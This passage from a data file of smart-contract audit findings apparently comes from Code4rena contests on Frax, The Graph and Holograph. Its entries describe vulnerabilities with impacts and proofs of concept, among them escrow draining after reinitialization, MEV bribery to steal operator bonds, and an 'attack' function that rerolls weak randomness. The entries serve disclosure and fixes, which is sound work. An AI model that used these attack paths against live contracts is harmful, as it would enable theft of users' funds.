(`(address(this).balance - currentWithheldETH) / DEPOSIT_SIZE`). However, when a lot of ETH was deposited into the contract / it was not called in a long time, this loop can reach the gas limit. When this happens, no more calls to `depositEther` are possible, as it will always run out of gas.  Of course, the probability that such a situation arises depends on the price of ETH. For >1,000 USD it would need require someone to deposit a large amount of money (which can also happen, there are whales with thousands of ETH, so if one of them would decide to use frxETH, the problem can arise). For lower prices, it can happen even for small (in dollar terms) deposits. And in general, the correct functionality of a protocol should not depend on the price of ETH.  ## Proof Of Concept Jerome Powell continues to rise interest rates, he just announced the next rate hike to 450%. The crypto market crashes, ETH is at 1 USD. Bob buys 100,000 ETH for 100,000 USD and deposits them into `frxETHMinter`. Because of this deposit, `numDeposit` within `depositEther` is equal to 3125. Therefore, every call to the function runs out of gas and it is not possible to deposit this ETH into the deposit contract.  ## Recommended Mitigation Steps It should be possible to specify an upper limit for the number of deposits such that progress is possible, even when a lot of ETH was deposited into the contract."}, {"title": "Wrong accounting logic when syncRewards() is called within beforeWithdraw makes withdrawals impossible", "html_url": "https://github.com/code-423n4/2022-09-frax-findings/issues/15", "labels": ["bug", "question", "3 (High Risk)", "primary issue", "sponsor confirmed", "syncRewards wrong nextRewards"], "target": "2022-09-frax-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-frax/blob/dc6684f77b4e9bd965e8862be7f5fb71473a4c4c/src/sfrxETH.sol#L50   # Vulnerability details  ## Impact `sfrxETH.beforeWithdraw` first calls the `beforeWithdraw` of `xERC4626`, which decrements `storedTotalAssets` by the given amount. If the timestamp is greater than the `rewardsCycleEnd`, `syncRewards` is called. However, the problem is that the assets have not been transfered out yet, meaning `asset.balanceOf(address(this))` still has the old value. On the other hand, `storedTotalAssets` was already updated. Therefore, the following calculation will be inflated by the amount for which the withdrawal was requested: ``` uint256 nextRewards = asset.balanceOf(address(this)) - storedTotalAssets_ - lastRewardAmount_; ``` This has severe consequences: 1.) During the following reward period, `lastRewardAmount` is too high, which means that too much rewards are paid out too users who want to withdraw. A user could exploit this to steal the assets of other users. 2.) When `syncRewards()` is called the next time, it is possible that the `nextRewards` calculation underflows because `lastRewardAmount > asset.balanceOf(address(this))`. This is very bad because `syncRewards()` will be called in every withdrawal (after the `rewardsCycleEnd`) and none of them will succeed because of the underflow. Depositing more also does not help here, it just increases `asset.balanceOf(address(this))` and `storedTotalAssets` by the same amount, which does not eliminate the underflow.  Note that this bug does not require a malicious user or a targeted attack to surface. It can (and probably will) happen in practice just by normal user interactions with the vault (which is for instance shown in the PoC).  ## Proof Of Concept Consider the following test: ``` function testTotalAssetsAfterWithdraw() public {                 uint128 deposit = 1 ether;         uint128 withdraw = 1 ether;         // Mint frxETH to this testing contract from nothing, for testing         mintTo(address(this), deposit);          // Generate some sfrxETH to this testing contract using frxETH         frxETHtoken.approve(address(sfrxETHtoken), deposit);         sfrxETHtoken.deposit(deposit, address(this));         require(sfrxETHtoken.totalAssets() == deposit);          vm.warp(block.timestamp + 1000);         // Withdraw frxETH (from sfrxETH) to this testing contract         sfrxETHtoken.withdraw(withdraw, address(this), address(this));         vm.warp(block.timestamp + 1000);         sfrxETHtoken.syncRewards();         require(sfrxETHtoken.totalAssets() == deposit - withdraw);     } ```  This is a normal user interaction where a user deposits into the vault, and makes a withdrawal some time later. However, at this point the `syncRewards()` within the `beforeWithdraw` is executed. Because of that, the documented accounting mistake happens and the next call (in fact every call that will be done in the future) to `syncRewards()` reverts with an underflow.  ## Recommended Mitigation Steps Call `syncRewards()` before decrementing `storedTotalAssets`, i.e.: ``` function beforeWithdraw(uint256 assets, uint256 shares) internal override {  if (block.timestamp >= rewardsCycleEnd) { syncRewards(); }  super.beforeWithdraw(assets, shares); // call xERC4626's beforeWithdraw AFTER } ``` Then, `asset.balanceOf(address(this))` and `storedTotalAssets` are still in sync within `syncRewards()`."}, {"title": "After proposed 0.8.0 upgrade kicks in, L2 finalizeInboundTransfer might not work.", "html_url": "https://github.com/code-423n4/2022-10-thegraph-findings/issues/289", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed", "selected for report"], "target": "2022-10-thegraph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-thegraph/blob/309a188f7215fa42c745b136357702400f91b4ff/contracts/l2/gateway/L2GraphTokenGateway.sol#L70   # Vulnerability details  ## Description  L2GraphTokenGateway uses the onlyL1Counterpart modifier to make sure finalizeInboundTransfer is only called from L1GraphTokenGateway. Its implementation is:  ```Solidity modifier onlyL1Counterpart() {         require(             msg.sender == AddressAliasHelper.applyL1ToL2Alias(l1Counterpart),             \"ONLY_COUNTERPART_GATEWAY\"         );         _;     } ```  It uses applyL1ToL2Alias defined as:  ``` uint160 constant offset = uint160(0x1111000000000000000000000000000000001111);      /// @notice Utility function that converts the address in the L1 that submitted a tx to     /// the inbox to the msg.sender viewed in the L2     /// @param l1Address the address in the L1 that triggered the tx to L2     /// @return l2Address L2 address as viewed in msg.sender     function applyL1ToL2Alias(address l1Address) internal pure returns (address l2Address) {         l2Address = address(uint160(l1Address) + offset);     } ```  This behavior matches with how Arbitrum augments the sender's address to L2. The issue is that I've spoken with the team and they are [planning](https://github.com/graphprotocol/contracts/pull/725) an upgrade from Solidity 0.7.6 to 0.8.0. Their proposed [changes](https://github.com/graphprotocol/contracts/blob/c4d3cb56cb4032dbb3a0f1b7535b5d94ccf86222/contracts/arbitrum/AddressAliasHelper.sol) will break this function, because under 0.8.0, this line has a ~ 1/15 chance to overflow:  `l2Address = address(uint160(l1Address) + offset);`  Interestingly, the sum intentionally wraps around using the uint160 type to return a correct address, but this wrapping will overflow in 0.8.0  ## Impact  There is a ~6.5% chance that finalizeInboundTransfer will not work.  ## Proof of Concept  l1Address is L1GraphTokenGateway, suppose its address is 0xF000000000000000000000000000000000000000.  Then 0xF000000000000000000000000000000000000000 + 0x1111000000000000000000000000000000001111 > UINT160_MAX , meaning overflow.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Wrap the calculation in an unchecked block, which will make it behave correctly."}, {"title": "initialize function in L2GraphToken.sol, BridgeEscrow.sol, L2GraphTokenGateway.sol, L1GraphTokenGateway.sol can be invoked multiple times from the implementation contract.", "html_url": "https://github.com/code-423n4/2022-10-thegraph-findings/issues/149", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed", "edited-by-warden", "selected for report"], "target": "2022-10-thegraph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-thegraph/blob/309a188f7215fa42c745b136357702400f91b4ff/contracts/l2/gateway/L2GraphTokenGateway.sol#L87 https://github.com/code-423n4/2022-10-thegraph/blob/309a188f7215fa42c745b136357702400f91b4ff/contracts/l2/token/L2GraphToken.sol#L48 https://github.com/code-423n4/2022-10-thegraph/blob/309a188f7215fa42c745b136357702400f91b4ff/contracts/gateway/L1GraphTokenGateway.sol#L99 https://github.com/code-423n4/2022-10-thegraph/blob/309a188f7215fa42c745b136357702400f91b4ff/contracts/gateway/BridgeEscrow.sol#L20   # Vulnerability details  ## Impact  initialize function in L2GraphToken.sol, BridgeEscrow.sol, L2GraphTokenGateway.sol, L1GraphTokenGateway.sol   can be invoked multiple times from the implementation contract.  this means a compromised implementation can reinitialize the contract above and   become the owner to complete the privilege escalation then drain the user's fund.  Usually in Upgradeable contract, a initialize function is protected by the modifier  ```solidity  initializer ```  to make sure the contract can only be initialized once.  ## Proof of Concept Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.  1. The implementation contract is compromised,  2. The attacker reinitialize the BridgeEscrow contract  ```     function initialize(address _controller) external onlyImpl {         Managed._initialize(_controller);     } ```  the onlyGovernor modifier's result depends on the controller because  ```solidity     function _onlyGovernor() internal view {         require(msg.sender == controller.getGovernor(), \"Caller must be Controller governor\");     } ```  3. The attacker have the governor access to the BridgeEscrow,   4. The attack can call the approve function to approve malicious contract   ```solidity      function approveAll(address _spender) external onlyGovernor {         graphToken().approve(_spender, type(uint256).max);     } ```  5. The attack can drain all the GRT token from the BridgeEscrow.  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  We recommend the project use the modifier   ```solidity  initializer ```  to protect the initialize function from being reinitiated  ```solidity    function initialize(address _owner) external onlyImpl initializer  { ``` "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/501", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/m_Rassska-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/499", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/JC-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/492", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Deivitto-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/484", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Deivitto-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/480", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/0xNazgul-Q.md)."}, {"title": "`_payoutEth()` calculates `balance` with an offset, always leaving dust `ETH` in the contract", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/476", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "selected for report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/PA1D.sol#L391 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/PA1D.sol#L395   # Vulnerability details  Payout recipients can call `getEthPayout()` to transfer the ETH balance of the contract to all payout recipients. This function makes an internal call to `_payoutEth`, which sends the payment to the recipients based on their associated `bp`  The issue is that the `balance` used in the `transfer` calls is not the contract ETH balance, but the balance minus a `gasCost`.  This means `getEthPayout()` calls will leave dust in the contract.  ## Impact  If the dust is small enough, a subsequent call to `getEthPayout` is likely to revert because of [this check](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/PA1D.sol#L390). And `enforcer/PA1D` does not have any other ETH withdrawal function. While `enforcer/PA1D` is meant to be used via delegate calls from a NFT collection contract, if the NFT contract does not have any withdrawal function either, this dust mentioned above is effectively lost.  ## Proof-Of-Concept  Let us take the example of a payout recipient trying to retrieve their share of the balance, equal to `40_000` For simplicity, assume one payout address, owned by Alice:  - Alice calls `getEthPayout()`, which in turn calls `_payoutEth()` - `gasCost = (23300 * length) + length = 23300 + 1 = 23301` - `balance = address(this).balance = 40000` - `balance - gasCost = 40000 - 23301 = 16699`, - `sending = ((bps[i] * balance) / 10000) = 10000 * 16699 / 10000 = 16699` - Alice receives `16699`.  Alice has to wait for the balance to increase to call `getEthPayout()` again. But no matter what, there will always be at least a dust of `10000` left in the contract.   ## Tools Used  Manual Analysis   ## Mitigation  The transfers should be done based on `address(this).balance`. The `gasCost` is redundant as the gas amount is specified by the caller of `getEthPayout()`, the contract does not have to provide gas.  ```diff -391: balance = balance - gasCost; 392:     uint256 sending; 393:     // uint256 sent; 394:     for (uint256 i = 0; i < length; i++) { 395:       sending = ((bps[i] * balance) / 10000); 396:       addresses[i].transfer(sending); 397:       // sent = sent + sending; 398:     } ```"}, {"title": "MEV: Operator can bribe miner and steal honest operator's bond amount if gas price went high", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/473", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "selected for report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L354   # Vulnerability details  ## Description Operators in Holograph do their job by calling executeJob() with the bridged in bytes from source chain.  If the primary job operator did not execute the job during his allocated block slot, he is punished by taking a single bond amount and transfer it to the operator doing it instead.  The docs and code state that if there was a gas spike in the operator's slot, he shall not be punished. The way a gas spike is checked is with this code in executeJob: ``` require(gasPrice >= tx.gasprice, \"HOLOGRAPH: gas spike detected\"); ```  However, there is still a way for operator to claim primary operator's bond amount although gas price is high. Attacker can submit a flashbots bundle including the executeJob() transaction, and one additional \"bribe\" transaction. The bribe transaction will transfer some incentive amount to coinbase address (miner), while the executeJob is submitted with a low gasprice. Miner will accept this bundle as it is overall rewarding enough for them, and attacker will receive the base bond amount from victim operator. This threat is not theoretical because every block we see MEV bots squeezing value from such opportunities.  info about coinbase [transfer](https://docs.flashbots.net/flashbots-auction/searchers/advanced/coinbase-payment) info about bundle [selection](https://docs.flashbots.net/flashbots-auction/searchers/advanced/bundle-pricing#bundle-ordering-formula)  ## Impact  Dishonest operator can take honest operator's bond amount although gas price is above acceptable limits.  ## Tools Used  Manual audit, flashbot docs  ## Recommended Mitigation Steps  Do not use current tx.gasprice amount to infer gas price in a previous block.  Probably best to use gas price oracle."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/472", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/ajtra-Q.md)."}, {"title": "MED - Incorrect implementation of ERC721 may have bad consequences for receiver", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/469", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "selected for report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L467   # Vulnerability details  ## Description  HolographERC721.sol is an enforcer contract that fully implements ERC721. In its safeTransferFromFunction there is the following code: ``` if (_isContract(to)) {   require(     (ERC165(to).supportsInterface(ERC165.supportsInterface.selector) &&       ERC165(to).supportsInterface(ERC721TokenReceiver.onERC721Received.selector) &&       ERC721TokenReceiver(to).onERC721Received(address(this), from, tokenId, data) ==       ERC721TokenReceiver.onERC721Received.selector),     \"ERC721: onERC721Received fail\"   ); } ``` If the target address is a contract, the enforcer requires the target's onERC721Received() to succeed. However, the call deviates from the [standard](https://eips.ethereum.org/EIPS/eip-721): ``` interface ERC721TokenReceiver {     /// @notice Handle the receipt of an NFT     /// @dev The ERC721 smart contract calls this function on the recipient     ///  after a `transfer`. This function MAY throw to revert and reject the     ///  transfer. Return of other than the magic value MUST result in the     ///  transaction being reverted.     ///  Note: the contract address is always the message sender.     /// @param _operator The address which called `safeTransferFrom` function     /// @param _from The address which previously owned the token     /// @param _tokenId The NFT identifier which is being transferred     /// @param _data Additional data with no specified format     /// @return `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))`     ///  unless throwing     function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes _data) external returns(bytes4); } ```  The standard mandates that the first parameter will be the operator - the caller of safeTransferFrom. The enforcer passes instead the address(this) value, in other words the Holographer address. The impact is that any bookkeeping done in target contract, and allow / disallow decision of the transaction, is based on false information.  ## Impact  ERC721 transferFrom's \"to\" contract may fail to accept transfers, or record credit of transfers incorrectly.   ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Pass the msg.sender parameter, as the ERC721 standard requires."}, {"title": "MED: leak of value when interacting with an ERC721 enforcer contract", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/468", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "selected for report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L962   # Vulnerability details  ## Description  HolographERC721.sol is an enforcer of the ERC721 standard. In its fallback function, it calls the actual implementation in order to handle additional logic.   If Holographer is called with no calldata and some msg.value, the call will reach the  receive() function, which does not forward the call down to the implementation.  This can be a serious value leak issue, because the underlying implementation may have valid behavior for handling sending of value. For example, it can mint the next available tokenID and credit it to the user. Since this logic is never reached, the entire msg.value is just leaked.  ## Impact  Leak of value when interacting with an NFT using the receive() or fallback() callback. Note that if NFT implements fallback OR receive() function, execution will never reach either of them from the enforcer's receive() function.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Funnel receive() empty calls down to the implementation."}, {"title": "MED: isOwner / onlyOwner checks can be bypassed by attacker in ERC721/ERC20 implementations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/464", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "selected for report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/abstract/ERC721H.sol#L185 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/abstract/ERC721H.sol#L121   # Vulnerability details  ## Description  ERC20H and ERC721H are base contracts for NFTs / coins to inherit from. They supply the modifier onlyOwner and function isOwner which are used in the implementations for access control. However, there are several functions which when using these the answer may be corrupted to true by an attacker.  The issue comes from confusion between calls coming from HolographERC721's fallback function, and calls from actually implemented functions.   In the fallback function, the enforcer appends an additional 32 bytes of msg.sender : ``` assembly {   calldatacopy(0, 0, calldatasize())   mstore(calldatasize(), caller())   let result := call(gas(), sload(_sourceContractSlot), callvalue(), 0, add(calldatasize(), 32), 0, 0)   returndatacopy(0, 0, returndatasize())   switch result   case 0 {     revert(0, returndatasize())   }   default {     return(0, returndatasize())   } } ```  Indeed these are the bytes read as msgSender: ``` function msgSender() internal pure returns (address sender) {   assembly {     sender := calldataload(sub(calldatasize(), 0x20))   } } ```  and isOwner simply compares these to the stored owner: ``` function isOwner() external view returns (bool) {   if (msg.sender == holographer()) {     return msgSender() == _getOwner();   } else {     return msg.sender == _getOwner();   } } ```  However, the enforcer calls these functions directly in several locations, and in these cases it of course does not append a 32 byte msg.sender. For example, in safeTransferFrom: ``` function safeTransferFrom(   address from,   address to,   uint256 tokenId,   bytes memory data ) public payable {   require(_isApproved(msg.sender, tokenId), \"ERC721: not approved sender\");   if (_isEventRegistered(HolographERC721Event.beforeSafeTransfer)) {     require(SourceERC721().beforeSafeTransfer(from, to, tokenId, data));   }   _transferFrom(from, to, tokenId);   if (_isContract(to)) {     require(       (ERC165(to).supportsInterface(ERC165.supportsInterface.selector) &&         ERC165(to).supportsInterface(ERC721TokenReceiver.onERC721Received.selector) &&         ERC721TokenReceiver(to).onERC721Received(address(this), from, tokenId, data) ==         ERC721TokenReceiver.onERC721Received.selector),       \"ERC721: onERC721Received fail\"     );   }   if (_isEventRegistered(HolographERC721Event.afterSafeTransfer)) {     require(SourceERC721().afterSafeTransfer(from, to, tokenId, data));   } } ```  Here, caller has arbitrary control of the data parameter, and can pass owner's address.When the implementation, SourceERC721(), gets called, beforeSafeTransfer / afterSafeTransfer will behave as if they are called by owner.  Therefore, depending on the actual implementation, derived contracts can lose funds by specifying owner-specific logic.   This pattern occurs with the following functions, which have an arbitrary data parameter: - beforeSafeTransfer / after SafeTransfer - beforeTransfer / afterTransfer - beforeOnERC721Received / afterOnERC721Received - beforeOnERC20Received / aferERC20Received  ## Impact  Owner-specific functionality can be initiated on NFT / ERC20 implementation contracts  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Refactor the code to represent msg.sender information in a bug-free way."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/458", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/brgltd-Q.md)."}, {"title": "`_payoutToken[s]()` is not compatible with tokens with missing return value", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/456", "labels": ["bug", "2 (Med Risk)", "primary issue", "sponsor confirmed", "selected for report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/enforcer/PA1D.sol#L317 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/enforcer/PA1D.sol#L340   # Vulnerability details    ## Impact Payout is blocked and tokens are stuck in contract.  ## Proof of Concept `PA1D._payoutToken()` and `PA1D._payoutTokens()` call `ERC20.transfer()` in a require-statement to send tokens to a list of payout recipients. Some tokens do not return a bool (e.g. USDT, BNB, OMG) on ERC20 methods. But since the require-statement expects a `bool`, for such a token a `void` return will also cause a revert, despite an otherwise successful transfer. That is, the token payout will always revert for such tokens.  ## Tools Used Code inspection  ## Recommended Mitigation Steps Use [OpenZeppelin's SafeERC20](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol), which handles the return value check as well as non-standard-compliant tokens."}, {"title": " LayerZeroModule miscalculates gas, risking loss of assets", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/445", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed", "selected for report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/module/LayerZeroModule.sol#L431-L445   # Vulnerability details  ## Description  Holograph gets it's cross chain messaging primitives through Layer Zero. To get pricing estimate, it uses the DstConfig price struct exposed in LZ's [RelayerV2](https://github.com/LayerZero-Labs/LayerZero/blob/main/contracts/RelayerV2.sol#L133)  The issue is that the important baseGas and gasPerByte configuration parameters, which are used to calculate a custom amount of gas for the destination LZ message, use the values that come from the *source* chain. This is in contrast to LZ which handles DstConfigs in a mapping keyed by chainID.  The encoded gas amount is described [here](https://layerzero.gitbook.io/docs/guides/advanced/relayer-adapter-parameters)  ## Impact  The impact is that when those fields are different between chains, one of two things may happen: 1. Less severe - we waste excess gas, which is refunded to the lzReceive() caller (Layer Zero) 2. More severe - we underprice the delivery cost, causing lzReceive() to revert and the NFT stuck in limbo forever.  The code does not handle a failed lzReceive (differently to a failed executeJob). Therefore, no failure event is emitted and the NFT is screwed.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Firstly,make sure to use the target gas costs. Secondly, re-engineer lzReceive to be fault-proof, i.e. save some gas to emit result event."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/442", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Josiah-Q.md)."}, {"title": "HolographERC20 breaks composability by forcing usage of draft proposal EIP-4524", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/440", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed", "selected for report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC20.sol#L539   # Vulnerability details  ## Description  HolographERC20 is the ERC20 enforcer for Holograph. In  the safeTransferFrom operation, it calls \\_checkOnERC20Received:  ``` if (_isEventRegistered(HolographERC20Event.beforeSafeTransfer)) {   require(SourceERC20().beforeSafeTransfer(account, recipient, amount, data)); } _transfer(account, recipient, amount); require(_checkOnERC20Received(account, recipient, amount, data), \"ERC20: non ERC20Receiver\"); if (_isEventRegistered(HolographERC20Event.afterSafeTransfer)) {   require(SourceERC20().afterSafeTransfer(account, recipient, amount, data)); } ```  The checkOnERC20Received function: ``` if (_isContract(recipient)) {   try ERC165(recipient).supportsInterface(ERC165.supportsInterface.selector) returns (bool erc165support) {     require(erc165support, \"ERC20: no ERC165 support\");     // we have erc165 support     if (ERC165(recipient).supportsInterface(0x534f5876)) {       // we have eip-4524 support       try ERC20Receiver(recipient).onERC20Received(address(this), account, amount, data) returns (bytes4 retv         return retval == ERC20Receiver.onERC20Received.selector;       } catch (bytes memory reason) {         if (reason.length == 0) {           revert(\"ERC20: non ERC20Receiver\");         } else {           assembly {             revert(add(32, reason), mload(reason))           }         }       }     } else {       revert(\"ERC20: eip-4524 not supported\");     }   } catch (bytes memory reason) {     if (reason.length == 0) {       revert(\"ERC20: no ERC165 support\");     } else {       assembly {         revert(add(32, reason), mload(reason))       }     }   } } else {   return true; } ```  In essence, if the target is a contract, the enforcer requires it to fully implement EIP-4524. The problem is that [this](https://eips.ethereum.org/EIPS/eip-4524) EIP is just a draft proposal, which the project cannot assume to be supported by any receiver contract, and definitely not every receiver contract.  The specs warn us: ``` \u26a0\ufe0f This EIP is not recommended for general use or implementation as it is likely to change.  ```  Therefore, it is a very dangerous requirement to add in an ERC20 enforcer, and must be left to the implementation to do if it so desires.  ## Impact  ERC20s enforced by HolographERC20 are completely uncomposable. They cannot be used for almost any DeFi application, making it basically useless.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Remove the EIP-4524 requirements altogether."}, {"title": " Attacker can force chaotic operator behavior", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/432", "labels": ["bug", "2 (Med Risk)", "primary issue", "sponsor confirmed", "selected for report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L875   # Vulnerability details  ## Description  Operators are organized into different pod tiers. Every time a new request arrives, it is scheduled to a random available pod. It is important to note that pods may be empty, in which case the pod array actually has a single zero element to help with all sorts of bugs. When a pod of a non existing tier is created, any intermediate tiers between the current highest tier to the new tier are filled with zero elements. This happens at bondUtilityToken():  ``` if (_operatorPods.length < pod) {   /**    * @dev activate pod(s) up until the selected pod    */   for (uint256 i = _operatorPods.length; i <= pod; i++) {     /**      * @dev add zero address into pod to mitigate empty pod issues      */     _operatorPods.push([address(0)]);   } } ```  The issue is that any user can spam the contract with a large amount of empty operator pods. The attack would look like this:  1. bondUtilityToken(attacker, large_amount, high_pod_number) 2. unbondUtilityToken(attacker, attacker)  The above could be wrapped in a flashloan to get virtually any pod tier filled.  The consequence is that when the scheduler chooses pods uniformally, they will very likely choose an empty pod, with the zero address. Therefore, the chosen operator will be 0, which is referred to in the code as \"open season\". In this occurrance, any operator can perform the executeJob() call. This is of course really bad, because all but one operator continually waste gas for executions that will be reverted after the lucky first transaction goes through. This would be a practical example of a griefing attack on Holograph.   ## Impact  Any user can force chaotic \"open season\" operator behavior  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  It is important to pay special attention to the scheduling algorithm, to make sure different pods are given execution time according to the desired heuristics."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/429", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/m_Rassska-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/428", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/ajtra-G.md)."}, {"title": "Bad source of randomness", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/427", "labels": ["bug", "2 (Med Risk)", "primary issue", "sponsor confirmed", "selected for report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L491-L511   # Vulnerability details  ## Impact Using block.number and block.timestamp as a source of randomness is commonly advised against, as the outcome can be manipulated by calling contracts. In this case a compromised layer-zero-endpoint would be able to retry the selection of the primary operator until the result is favorable to the malicious actor.  ## Proof of Concept An attack path for rerolling the result of bad randomness might look roughly like this:  ```js function attack(uint256 currentNonce, uint256 wantedPodIndex, uint256 numPods, uint256 wantedOperatorIndex, uint256 numOperators,  bytes calldata bridgeInRequestPayload) external{      bytes32 jobHash = keccak256(bridgeInRequestPayload);      //same calculation as in HolographOperator.crossChainMessage     uint256 random = uint256(keccak256(abi.encodePacked(jobHash, currentNonce, block.number, block.timestamp)));      require(wantedPodIndex == random % numPods)     require(wantedOperatorIndex == random % numOperators);      operator.crossChainMessage(bridgeInRequestPayload); } ```  The attack basically consists of repeatedly calling the `attack` function with data that is known and output that is wished for until the results match and only then continuing to calling the operator.   ## Tools Used  Manual Review  ## Recommended Mitigation Steps Consider using a decentralized oracle for the generation of random numbers, such as [Chainlinks VRF](https://docs.chain.link/docs/vrf/v2/introduction/).  It should be noted, that in this case there is a prerequirement of the 